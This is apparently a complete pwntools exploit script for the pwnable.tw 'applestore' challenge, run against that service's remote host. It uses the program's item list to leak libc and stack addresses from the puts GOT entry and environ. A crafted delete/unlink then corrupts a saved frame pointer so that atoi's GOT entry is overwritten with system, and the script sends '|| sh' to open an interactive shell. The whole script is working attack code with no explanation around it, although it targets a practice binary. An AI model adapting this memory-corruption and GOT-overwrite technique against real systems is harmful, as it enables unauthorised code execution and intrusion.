from pwn import *
e=ELF('./libc_32.so.6')
context(arch='i386',log_level='debug')
# p=process("./applestore",env={"LD_PRELOAD":"./libc_32.so.6"})
p=remote("chall.pwnable.tw",10104)
def add(num):
	p.sendlineafter('>','2')
	p.sendlineafter('Device Number>',num)
def delete(num):
	p.sendlineafter('>','3')
	p.sendlineafter('Item Number>',num)
def lst(payload):
	p.sendlineafter('>','4')
	p.sendlineafter('(y/n) >',payload)
def checkout():
	p.sendlineafter('>','5')
	p.sendlineafter('(y/n) >','y')

def leak_mem(addr):
	payload='yy'+p32(addr)+p32(1)+p32(0)
	lst(payload)
	p.recvuntil('27: ')
	return u32(p.recvuntil('$')[:4])


for i in range(19):
	add('1')

for i in range(6):
	add('3')
add('4')
# gdb.attach(p,"b *0x08048BB4\nb *0x080488A3\nb *0x080488AE\nc")
# sleep(3)
##iphone8: 0xffa98078
checkout()
p.recv()

# gdb.attach(p,"b *0x08048BB4\nc")
got_puts=0x804B028
# payload='yy'+p32(got_puts)+p32(1)+p32(0)
# lst(payload)
# # lst()
# p.recvuntil('27: ')
# libc_base=u32(p.recvuntil('$')[:4])-389440

libc_base=leak_mem(got_puts)-389440
print hex(libc_base)

sys_addr=libc_base+e.symbols['system']
sh_addr=libc_base+58871
# print hex(sys_addr)

############################################################
## stack addr ##############################################
#############################################################
environ=libc_base+e.symbols['environ']
del_stack_ebp=leak_mem(environ)-0xc4-0x40
print hex(del_stack_ebp)
#############################################################
########### change ebp of handler() #######################
#######################################################
got_atoi=0x0804B040
payload="27"+p32(got_puts)+p32(1)+p32(got_atoi+0x22)+p32(del_stack_ebp-8)
delete(payload)

p.sendlineafter('>',p32(sys_addr)+'|| sh\x00')



p.interactive()